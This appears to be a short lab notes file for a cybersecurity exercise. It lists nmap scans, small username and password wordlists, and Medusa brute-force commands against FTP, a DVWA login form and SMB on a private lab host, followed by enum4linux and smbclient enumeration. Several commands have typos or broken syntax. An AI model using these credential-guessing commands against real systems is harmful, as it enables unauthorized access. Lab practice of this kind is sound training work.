# desafio-cyber-test
nmap -v 192.168.0.6 -p 20, 21

printf "user\nmsfadmin\nadmin\nroot\nadm\nhost\n" > users.txt
printf "password\n123456\nWelcome123\nmsfadmin\nadmin\n" > password.txt

medusa -h 192.168.0.6 -U users.txt -P password.txt -M ftp -t 6 > ftp_credenciais.txt

# entrando com as credenciais obtidas
ftp 192.168.0.6
msfadmin
msfadmin

-------------------
medusa -h 192.168.0.6-U users.txt -P password.txt \
-M http -m FORM:POST:/dwva/login.php \
-m FORM-DATA:"username=^USER^&password=^PASS^&Login=Login" \
-m DENY-SIGNAL: "Login failed"
-T 10 -t 5
--------------------
nmap -v 192.168.0.6 -p 445

enum4linux -U 192.168.0.6

medusa -L users.txt -P passwords.txt 192.168.0.6 smb -t 4 -V

smbclient -L //192.168.0.6 -U msfadmin
